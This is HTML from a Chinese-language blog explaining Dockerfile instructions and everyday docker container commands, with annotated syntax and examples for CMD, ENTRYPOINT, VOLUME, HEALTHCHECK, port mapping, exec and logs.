CMD <span class="token punctuation">[</span><span class="token string">"executable"</span>,<span class="token string">"param1"</span>,<span class="token string">"param2"</span><span class="token punctuation">]</span>

<span class="token comment"># 在 /bin/sh 中执行，提供给需要交互的应用；此种形式支持环境变量</span>
CMD <span class="token builtin class-name">command</span> param1 param2

<span class="token comment"># 提供给 ENTRYPOINT 命令的默认参数</span>
CMD <span class="token punctuation">[</span><span class="token string">"param1"</span>,<span class="token string">"param2"</span><span class="token punctuation">]</span></code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">CMD <span class="token punctuation">[</span><span class="token string">"nginx"</span>, <span class="token string">"-g"</span>, <span class="token string">"daemon off;"</span><span class="token punctuation">]</span></code></pre>

<h4 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h4><p>入口点，功能类似于<code>CMD</code>，配置容器启动后执行的命令及参数</p>
<ul>
<li><code>ENTRYPOINT</code> 不能被 <code>docker run</code> 提供的参数覆盖，而是以追加的形式作为 <code>ENTRYPOINT</code> 的参数</li>
<li>每个 Dockerfile 中只能有一个 ENTRYPOINT，当指定多个时，只有最后一个生效</li>
</ul>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用 exec 执行</span>
ENTRYPOINT <span class="token punctuation">[</span><span class="token string">"executable"</span>, <span class="token string">"param1"</span>, <span class="token string">"param2"</span><span class="token punctuation">]</span>

<span class="token comment"># shell中执行</span>
ENTRYPOINT <span class="token builtin class-name">command</span> param1 param2</code></pre>

<p><code>CMD</code> 和 <code>ENTRYPOINT</code> 都定义了容器运行时的执行命令。如下是它们的一些使用规则：</p>
<ul>
<li><code>CMD</code> 和 <code>ENTRYPOINT</code> 在 Dockerfiles 中应该至少应该有一个被定义</li>
<li>当构建可执行容器时，应该定义 <code>ENTRYPOINT</code> 指令</li>
<li><code>CMD</code> 要么用于给 <code>ENTRYPOINT</code> 提供默认参数，要么用于在容器中执行一个特定命令</li>
<li><code>CMD</code> 可以通过容器启动命令 <code>docker run</code> 的参数来替换它</li>
</ul>
<h4 id="ARG"><a href="#ARG" class="headerlink" title="ARG"></a>ARG</h4><p><code>ARG</code> 在 build 阶段指定变量，和 <code>ENV</code> 不同的是，容器运行时不会存在这些环境变量</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ARG <span class="token operator">&lt;</span>name<span class="token operator">></span><span class="token punctuation">[</span><span class="token operator">=</span><span class="token operator">&lt;</span>default value<span class="token operator">></span><span class="token punctuation">]</span></code></pre>

<ul>
<li><p>如果和 <code>ENV</code> 同名，<code>ENV</code> 覆盖 <code>ARG</code> 变量</p>
</li>
<li><p>可以用 <code>docker build --build-arg &lt;参数名&gt;=&lt;值&gt;</code> 来覆盖</p>
</li>
<li><p>在 <code>FROM</code> 之前声明的 <code>ARG</code> 在构建阶段之外，所以它不能在 <code>FROM</code> 之后的任何指令中使用。 要使用在第一个<code>FROM</code> 之前声明的 <code>ARG</code> 的默认值，请在构建阶段内使用没有值的 <code>ARG</code> 指令</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 示例:</span>
ARG <span class="token assign-left variable">VERSION</span><span class="token operator">=</span>latest
FROM busybox:<span class="token variable">$VERSION</span>
ARG VERSION
RUN <span class="token builtin class-name">echo</span> <span class="token variable">$VERSION</span> <span class="token operator">></span> image_version</code></pre></li>
</ul>
<h4 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h4><p>匿名卷，将宿主机上的目录挂载至 <code>VOLUME</code> 指定的容器目录。即使容器后期被删除，此宿主机的目录仍会保留，从而实现容器数据的持久保存</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">VOLUME <span class="token operator">&lt;</span>容器内路径<span class="token operator">></span>
VOLUME <span class="token punctuation">[</span><span class="token string">"&lt;容器内路径1>"</span>, <span class="token string">"&lt;容器内路径2>"</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span></code></pre>

<ul>
<li><p><code>VOLUME</code> 实现的是匿名卷，无法指定宿主机路径和容器目录的挂载关系，宿主机目录位于：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">/var/lib/docker/volumes/</code></pre>
</li>
<li><p>通过<code>docker rm -fv &lt;容器ID&gt;</code> 可以删除容器的同时删除 VOLUME 指定的卷</p>
</li>
<li><p>如果要指定宿主机目录，使用 <code>docker run</code> 的 -v 参数，参考：<a href="./docker%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86/">docker 数据管理</a></p>
</li>
</ul>
<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1. dockerfile，生成两个匿名卷</span>
VOLUME <span class="token punctuation">[</span> <span class="token string">"/testdata"</span>,<span class="token string">"/testdata2"</span> <span class="token punctuation">]</span>

<span class="token comment"># 2. 进入容器，测试</span>
<span class="token function">cp</span> /etc/issue /testdata/f1.txt
<span class="token function">cp</span> /etc/issue /testdata2/f2.txt

<span class="token comment"># 3. 查看宿主机目录</span>
$ tree /var/lib/containers/storage/volumes/
/var/lib/containers/storage/volumes/
├── 725f0f67921bdbffbe0aaf9b015d663a6e3ddd24674990d492025dfcf878529b
│ └── _data
│ └── f1.txt
└── fbd13e5253deb375e0dea917df832d2322e96b04ab43bae061584dcdbe7e89f2
└── _data
└── f2.txt</code></pre>

<h4 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h4><h4 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h4><p>指定工作目录，即后续 <code>RUN</code>、<code>CMD</code>、<code>ENTRYPOINT</code> 指令的相对路径，如该目录不存在，<code>WORKDIR</code> 会自行创建</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">WORKDIR /path/to/workdir</code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 两次RUN独立运行,不在同一个目录，</span>
RUN <span class="token builtin class-name">cd</span> /app
RUN <span class="token builtin class-name">echo</span> <span class="token string">"hello"</span> <span class="token operator">></span> world.txt

<span class="token comment"># 如果想实现相同目录可以使用WORKDIR</span>
WORKDIR /app
RUN <span class="token builtin class-name">echo</span> <span class="token string">"hello"</span> <span class="token operator">></span> world.txt

<span class="token comment"># 可以使用多个 WORKDIR 指令，后续命令如果参数是相对路径，则会基于之前命令指定的路径</span>
WORKDIR /a
WORKDIR b
WORKDIR c
RUN <span class="token builtin class-name">pwd</span>			<span class="token comment"># /a/b/c</span></code></pre>

<h4 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h4><p><code>ONBUILD</code> 指令在当前镜像 build 阶段不会执行，会在子镜像 build 阶段执行，即：延迟执行</p>
<p>使用 ONBUILD 指令的镜像，推荐在标签中注明，例如 ruby:1.9-onbuild</p>
<h4 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h4><p>指定执行后续指令的用户和用户组，后续的 RUN 也会使用指定用户，默认是 root 身份执行</p>
<p>这个用户必须是事先建立好的，否则无法切换</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token environment constant">USER</span> <span class="token operator">&lt;</span>user<span class="token operator">></span><span class="token punctuation">[</span>:<span class="token operator">&lt;</span>group<span class="token operator">></span><span class="token punctuation">]</span>
<span class="token environment constant">USER</span> <span class="token operator">&lt;</span><span class="token environment constant">UID</span><span class="token operator">></span><span class="token punctuation">[</span>:<span class="token operator">&lt;</span>GID<span class="token operator">></span><span class="token punctuation">]</span></code></pre>

<h4 id="HEALTHCHECK"><a href="#HEALTHCHECK" class="headerlink" title="HEALTHCHECK"></a>HEALTHCHECK</h4><p>检查容器的健康性</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">HEALTHCHECK <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> CMD <span class="token operator">&lt;</span>命令<span class="token operator">></span> 	<span class="token comment"># 设置检查容器健康状况的命令</span>
HEALTHCHECK NONE 	<span class="token comment"># 如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令</span>

<span class="token parameter variable">--interval</span><span class="token operator">=</span><span class="token operator">&lt;</span>间隔<span class="token operator">></span> <span class="token comment">#两次健康检查的间隔，默认为 30 秒</span>
<span class="token parameter variable">--timeout</span><span class="token operator">=</span><span class="token operator">&lt;</span>时长<span class="token operator">></span>  <span class="token comment">#健康检查命令运行超时时间，如果超过这个时间，本次健康检查就被视为失败，默认 30 秒</span>
<span class="token parameter variable">--retries</span><span class="token operator">=</span><span class="token operator">&lt;</span>次数<span class="token operator">></span>  <span class="token comment">#当连续失败指定次数后，则将容器状态视为 unhealthy，默认3次</span>
--start-period<span class="token operator">=</span><span class="token operator">&lt;</span>FDURATION<span class="token operator">></span> <span class="token comment">#default: 0s</span></code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">FROM nginx
RUN <span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> <span class="token function">curl</span> <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /var/lib/apt/lists/*
HEALTHCHECK <span class="token parameter variable">--interval</span><span class="token operator">=</span>5s <span class="token parameter variable">--timeout</span><span class="token operator">=</span>3s <span class="token punctuation">\</span>
	CMD <span class="token function">curl</span> <span class="token parameter variable">-fs</span> http://localhost/ <span class="token operator">||</span> <span class="token builtin class-name">exit</span> <span class="token number">1</span></code></pre>

<h4 id="STOPSIGNAL"><a href="#STOPSIGNAL" class="headerlink" title="STOPSIGNAL"></a>STOPSIGNAL</h4><p>退出容器的信号</p>
<p><code>STOPSIGNAL</code> 设置将被发送到容器退出的系统调用信号。该信号可以是与内核 syscall 表中的位置匹配的有效无符号数字（例如 9），也可以是 SIGNAME 格式的信号名称（例如 SIGKILL）</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">STOPSIGNAL signal</code></pre>

<h4 id="SHELL"><a href="#SHELL" class="headerlink" title="SHELL"></a>SHELL</h4><p>指定 shell，<code>SHELL</code>指令可以出现多次。 每个<code>SHELL</code>指令将覆盖所有先前的<code>SHELL</code>指令，并影响所有后续的指令</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token environment constant">SHELL</span> <span class="token punctuation">[</span><span class="token string">"executable"</span>, <span class="token string">"parameters"</span><span class="token punctuation">]</span></code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token environment constant">SHELL</span> <span class="token punctuation">[</span><span class="token string">"powershell"</span>, <span class="token string">"-command"</span><span class="token punctuation">]</span>
<span class="token environment constant">SHELL</span> <span class="token punctuation">[</span><span class="token string">"cmd"</span>, <span class="token string">"/S"</span>, <span class="token string">"/C"</span><span class="token punctuation">]</span></code></pre>

<h4 id="dockerignore-文件"><a href="#dockerignore-文件" class="headerlink" title=".dockerignore 文件"></a>.dockerignore 文件</h4><p>与.gitignore 文件类似，生成构建上下文时 Docker 客户端应忽略的文件和文件夹指定模式</p>
<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">test/*			<span class="token comment">#排除 test 目录下的所有文件</span>
md/xttblog.md	<span class="token comment">#排除 md 目录下的 xttblog.md 文件</span>
xttblog/*.md	<span class="token comment">#排除 xttblog 目录下的所有 .md 的文件</span>
xttblog?		<span class="token comment">#排除以 xttblog 为前缀的文件和文件夹</span>
**/*.sql		<span class="token comment">#排除所有目录下的 .sql 文件夹</span>

<span class="token comment">#除了README的md不排外，排除所有md文件，但不排除README-secret.md</span>
*.md
<span class="token operator">!</span>README*.md
README-secret.md

<span class="token comment">#除了所有README的md文件以外的md都排除</span>
*.md
README-secret.md
<span class="token operator">!</span>README*.md</code></pre>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/Docker/1.3.docker%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/Docker/1.3.docker%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86/" class="post-title-link" itemprop="url">docker容器管理</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-08 11:27:26" itemprop="dateCreated datePublished" datetime="2021-01-08T11:27:26+08:00">2021-01-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/Docker/" itemprop="url" rel="index"><span itemprop="name">Docker</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="容器生命周期"><a href="#容器生命周期" class="headerlink" title="容器生命周期"></a>容器生命周期</h3><p><img data-src="//img.to2b.cn/blog/ljk/1605789687110.png"></p>
<h3 id="容器管理-docker-container"><a href="#容器管理-docker-container" class="headerlink" title="容器管理 docker container"></a>容器管理 <code>docker container</code></h3><h4 id="启动容器-run"><a href="#启动容器-run" class="headerlink" title="启动容器 run"></a>启动容器 <code>run</code></h4><p>每次 run，都会启动一个新的容器</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker run [选项] [镜像名] [shell命令] [参数]</span>
<span class="token function">docker</span> container run <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> IMAGE <span class="token punctuation">[</span>COMMAND<span class="token punctuation">]</span> <span class="token punctuation">[</span>ARG<span class="token punctuation">..</span>.<span class="token punctuation">]</span>

COMMAND：一次性运行容器中命令
OPTIONS：
-i, <span class="token parameter variable">--interactive</span>			Keep STDIN <span class="token function">open</span> even <span class="token keyword">if</span> not attached，通常和-t 一起使用
-t, <span class="token parameter variable">--tty</span>					分配 pseudo-TTY,通常和-i 一起使用,注意对应的容器必须运行 shell 才支持进入
-d, <span class="token parameter variable">--detach</span>				后台运行容器，并返回容器 ID，默认前台运行
<span class="token parameter variable">--name</span> string				启动容器时会自动随机字符作为容器名，--name 指定容器名称
<span class="token parameter variable">-h</span> string					设置虚拟机内的 <span class="token function">hostname</span>
<span class="token parameter variable">--rm</span>						退出后立即删除容器，一次性运行，下次从镜像中启动
-p, <span class="token parameter variable">--publish</span> list			（小写p）暴露指定端口映射，为避免宿主机端口冲突，要做好端口规划
-P, --publish-all			（大些P）暴露所有端口，随机，默认从 <span class="token number">32768</span> 开始
<span class="token parameter variable">--dns</span> list					Set custom DNS servers
<span class="token parameter variable">--entrypoint</span> string			Overwrite the default ENTRYPOINT of the image
<span class="token parameter variable">--privileged</span>				赋予虚拟机内的 root 真正的 root 权限，有权限宿主机，没有特殊需求不要使用
<span class="token parameter variable">-e</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>						传递环境变量
--env-file<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>				传递环境变量，文件
<span class="token parameter variable">--restart</span> string			容器的重启策略，面向生产环境的启动策略
              no				<span class="token comment"># 默认策略，容器退出时不重启容器</span>
              on-failure		<span class="token comment"># 容器非正常退出时（退出状态非 0），才会重启容器</span>
              on-failure:3		<span class="token comment"># 容器非正常退出时重启容器，最多重启 3 次</span>
              always			<span class="token comment"># 容器退出时总是重启容器，设置为 always，则启动 docker 服务的时候会自动启动容器</span>
              unless-stopped	<span class="token comment"># 容器退出时总是重启容器，但是不考虑在 docker 守护进程启动时就已经停止了的容器</span>
-v,--volume list			数据卷相关</code></pre>

<p><strong>注意：容器启动后，如果容器内没有前台运行的进程，将自动退出停止</strong></p>
<p><strong>退出容器：</strong><code>exit</code> 容器停止；<code>ctrl+p+q</code> 容器不停止</p>
<h4 id="查看容器信息"><a href="#查看容器信息" class="headerlink" title="查看容器信息"></a>查看容器信息</h4><h5 id="查看当前存在的容器-ls"><a href="#查看当前存在的容器-ls" class="headerlink" title="查看当前存在的容器 ls"></a>查看当前存在的容器 <code>ls</code></h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">ps</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span>
<span class="token function">docker</span> container <span class="token function">ls</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span>

选项:
-a, <span class="token parameter variable">--all</span> 		查看所所有容器，包括退出状态的容器（默认只显示处于运行状态的容器）
-q, <span class="token parameter variable">--quiet</span> 	Only display numeric IDs
-s, <span class="token parameter variable">--size</span> 		显示容器大小
-f, <span class="token parameter variable">--filter</span> 	过滤，例如 <span class="token variable"><span class="token variable">`</span><span class="token parameter variable">-f</span> <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">`</span></span>
-l, <span class="token parameter variable">--latest</span> 	显示最新创建的容器
-n, <span class="token parameter variable">--last</span> 		int Show n last created containers <span class="token punctuation">(</span>includes all states<span class="token punctuation">)</span><span class="token punctuation">(</span>default -1<span class="token punctuation">)</span></code></pre>

<h5 id="查看容器内的进程-top"><a href="#查看容器内的进程-top" class="headerlink" title="查看容器内的进程 top"></a>查看容器内的进程 <code>top</code></h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> container <span class="token function">top</span> CONTAINER <span class="token punctuation">[</span>ps OPTIONS<span class="token punctuation">]</span></code></pre>

<h5 id="查看容器资源使用情况-stats"><a href="#查看容器资源使用情况-stats" class="headerlink" title="查看容器资源使用情况 stats"></a>查看容器资源使用情况 <code>stats</code></h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker container stats --help</span>
Usage:	<span class="token function">docker</span> container stats <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> <span class="token punctuation">[</span>CONTAINER<span class="token punctuation">..</span>.<span class="token punctuation">]</span>

Options:
  -a, 	<span class="token parameter variable">--all</span>             	Show all containers <span class="token punctuation">(</span>default shows just running<span class="token punctuation">)</span>
  		<span class="token parameter variable">--format</span> string   	Pretty-print images using a Go template
  		--no-stream       	Disable streaming stats and only pull the first result
  		--no-trunc        	Do not truncate output</code></pre>

<h5 id="查看容器的详细信息-inspect"><a href="#查看容器的详细信息-inspect" class="headerlink" title="查看容器的详细信息 inspect"></a>查看容器的详细信息 <code>inspect</code></h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker container inspect --help</span>
Usage:	<span class="token function">docker</span> container inspect <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> CONTAINER <span class="token punctuation">[</span>CONTAINER<span class="token punctuation">..</span>.<span class="token punctuation">]</span>

Options:
  -f, <span class="token parameter variable">--format</span> string   Format the output using the given Go template
  -s, <span class="token parameter variable">--size</span>            Display total <span class="token function">file</span> sizes</code></pre>

<p>范例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> inspect <span class="token number">9997</span>
<span class="token function">docker</span> inspect <span class="token parameter variable">-f</span> <span class="token string">"&#123;&#123;.Metadata&#125;&#125;"</span> test:v1.0		<span class="token comment"># 选择性查看</span>
<span class="token function">docker</span> inspect <span class="token parameter variable">-f</span> <span class="token string">"&#123;&#123;.Created&#125;&#125;"</span> c1</code></pre>

<h4 id="删除容器-rm-、prune"><a href="#删除容器-rm-、prune" class="headerlink" title="删除容器 rm 、prune"></a>删除容器 <code>rm</code> 、<code>prune</code></h4><p><code>rm</code> 和 <code>prune</code> 都是删除容器。<code>rm</code> 是强制删除，即使容器处于运行状态；<code>prune</code> 只删除停止的容器。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker container rm --help</span>
Usage:	<span class="token function">docker</span> container <span class="token function">rm</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> CONTAINER <span class="token punctuation">[</span>CONTAINER<span class="token punctuation">..</span>.<span class="token punctuation">]</span>

Options:
  -f, <span class="token parameter variable">--force</span>     Force the removal of a running container <span class="token punctuation">(</span>uses SIGKILL<span class="token punctuation">)</span>
  -l, <span class="token parameter variable">--link</span>      Remove the specified <span class="token function">link</span>
  -v, <span class="token parameter variable">--volumes</span>   同时删除数据卷</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker container prune --help</span>
Usage:	<span class="token function">docker</span> container prune <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span>

Options:
  		<span class="token parameter variable">--filter</span> filter		Provide filter values <span class="token punctuation">(</span>e.g. <span class="token string">'until=&lt;timestamp>'</span><span class="token punctuation">)</span>
  -f, 	<span class="token parameter variable">--force</span>           	不提示确认信息</code></pre>

<p>范例：删除指定状态的容器</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">`</span><span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">-qf</span> <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">`</span></span></code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">rmc</span><span class="token operator">=</span><span class="token string">'docker container ls -aq | xargs -n1 docker container rm -f'</span></code></pre>

<h4 id="容器的启动和停止"><a href="#容器的启动和停止" class="headerlink" title="容器的启动和停止"></a>容器的启动和停止</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> start<span class="token operator">|</span>stop<span class="token operator">|</span>restart<span class="token operator">|</span>pause<span class="token operator">|</span>unpause 容器ID</code></pre>

<ul>
<li><code>start</code>：启动容器，后台启动，并执行默认 COMMAND</li>
<li><code>stop</code>：关闭容器</li>
<li><code>restart</code>：重启容器</li>
<li><code>pause</code>：暂停容器中的所有进程</li>
<li><code>unpause</code>：恢复容器中的进程</li>
</ul>
<h4 id="给正在运行的容器发信号-kill"><a href="#给正在运行的容器发信号-kill" class="headerlink" title="给正在运行的容器发信号 kill"></a>给正在运行的容器发信号 <code>kill</code></h4><p>默认信号 SIGKILL，即 9 信号</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker container kill --help</span>
Usage:	<span class="token function">docker</span> container <span class="token function">kill</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> CONTAINER <span class="token punctuation">[</span>CONTAINER<span class="token punctuation">..</span>.<span class="token punctuation">]</span>

Options:
  -s, <span class="token parameter variable">--signal</span> string   Signal to send to the container <span class="token punctuation">(</span>default <span class="token string">"KILL"</span><span class="token punctuation">)</span></code></pre>

<h4 id="进入正在运行的容器-exec"><a href="#进入正在运行的容器-exec" class="headerlink" title="进入正在运行的容器 exec"></a>进入正在运行的容器 <code>exec</code></h4><p><code>run -it</code> 是新建容器，并进入，如果要进入正在运行的容器，推荐使用 <code>exec</code>，exit 退出的时候容器不停止。</p>
<p>此外 <code>attach</code> 也可以进入容器，但是 exit 退出后容器会自动关闭，所以不推荐使用。</p>
<p><code>exec</code> 的作用是在运行的容器中执行命令</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker container exec --help</span>
Usage:	<span class="token function">docker</span> container <span class="token builtin class-name">exec</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> CONTAINER COMMAND <span class="token punctuation">[</span>ARG<span class="token punctuation">..</span>.<span class="token punctuation">]</span>

Options:
  -d, 	<span class="token parameter variable">--detach</span>               Detached mode: run <span class="token builtin class-name">command</span> <span class="token keyword">in</span> the background
  		--detach-keys string   Override the key sequence <span class="token keyword">for</span> detaching a container
  -e, 	<span class="token parameter variable">--env</span> list				Set environment variables
  -i, 	<span class="token parameter variable">--interactive</span>          Keep STDIN <span class="token function">open</span> even <span class="token keyword">if</span> not attached
        <span class="token parameter variable">--privileged</span>           Give extended privileges to the <span class="token builtin class-name">command</span>
  -t, 	<span class="token parameter variable">--tty</span>                  Allocate a pseudo-TTY
  -u, 	<span class="token parameter variable">--user</span> string          Username or <span class="token environment constant">UID</span> <span class="token punctuation">(</span>format: <span class="token operator">&lt;</span>name<span class="token operator">|</span>uid<span class="token operator">></span><span class="token punctuation">[</span>:<span class="token operator">&lt;</span>group<span class="token operator">|</span>gid<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">)</span>
  -w, 	<span class="token parameter variable">--workdir</span> string       Working directory inside the containe</code></pre>

<p>常见用法：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#常见用法</span>
<span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> 容器ID <span class="token function">sh</span><span class="token operator">|</span><span class="token function">bash</span>	<span class="token comment"># 进入容器，且exit退出但容器不停止</span></code></pre>

<h4 id="暴露端口"><a href="#暴露端口" class="headerlink" title="暴露端口"></a>暴露端口</h4><p>端口映射的本质就是利用 NAT 技术实现的</p>
<p>暴露所有端口，随机：大写 P</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> container run <span class="token parameter variable">-P</span></code></pre>

<p>暴露指定端口：小写 p</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> container run <span class="token parameter variable">-p</span>

<span class="token comment"># 范例</span>
<span class="token function">docker</span> run <span class="token parameter variable">-p</span> <span class="token number">80</span> <span class="token parameter variable">--name</span> nginx-test-port1 nginx	<span class="token comment"># 容器80映射到宿主机随机端口</span>
<span class="token function">docker</span> run <span class="token parameter variable">-p</span> <span class="token number">81</span>:80 <span class="token parameter variable">--name</span> nginx-test-port2 nginx	<span class="token comment"># 容器80端口映射到宿主机本地端口81</span>
<span class="token function">docker</span> run <span class="token parameter variable">-p</span> <span class="token number">10.0</span>.0.100:82:80 <span class="token parameter variable">--name</span> nginx-test-port3 docker.io/nginx	<span class="token comment"># 指定宿主机ip</span>
<span class="token function">docker</span> run <span class="token parameter variable">-p</span> <span class="token number">10.0</span>.0.100::80 <span class="token parameter variable">--name</span> nginx-test-port4 docker.io/nginx
<span class="token function">docker</span> run <span class="token parameter variable">-p</span> <span class="token number">10.0</span>.0.100:83:80/udp <span class="token parameter variable">--name</span> nginx-test-port5 docker.io/nginx <span class="token comment">#指定udp，默认tcp</span>
<span class="token comment"># 一次性映射多个端口+协议</span>
<span class="token function">docker</span> run <span class="token parameter variable">-p</span> <span class="token number">8080</span>:80/tcp <span class="token parameter variable">-p</span> <span class="token number">8443</span>:443/tcp <span class="token parameter variable">-p</span> <span class="token number">53</span>:53/udp <span class="token parameter variable">--name</span> nginx-test-port6 nginx</code></pre>

<h4 id="查看容器日志-logs"><a href="#查看容器日志-logs" class="headerlink" title="查看容器日志 logs"></a>查看容器日志 logs</h4><p>查看容器中运行的进程在控制台输出的日志信息，如果容器中的进程不在控制台输出日志，那就没办法了，所以这种方法一般不用</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker container logs --help</span>
Usage:	<span class="token function">docker</span> container logs <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> CONTAINER

Options:
  		<span class="token parameter variable">--details</span>        	Show extra details provided to logs
  -f, 	<span class="token parameter variable">--follow</span>         	Follow log output
  		<span class="token parameter variable">--since</span> string      Show logs since timestamp <span class="token punctuation">(</span>e.g. <span class="token number">2013</span>-01-02T13:23:37<span class="token punctuation">)</span> or relative <span class="token punctuation">(</span>e.g. 42m <span class="token keyword">for</span> <span class="token number">42</span> minutes<span class="token punctuation">)</span>
  		<span class="token parameter variable">--tail</span> string       Number of lines to show from the end of the logs <span class="token punctuation">(</span>default <span class="token string">"all"</span><span class="token punctuation">)</span>
  -t, 	<span class="token parameter variable">--timestamps</span>     	Show timestamps
  		<span class="token parameter variable">--until</span> string      Show logs before a timestamp <span class="token punctuation">(</span>e.g. <span class="token number">2013</span>-01-02T13:23:37<span class="token punctuation">)</span> or relative <span class="token punctuation">(</span>e.g. 42m <span class="token keyword">for</span> <span class="token number">42</span> minutes<span class="token punctuation">)</span></code></pre>

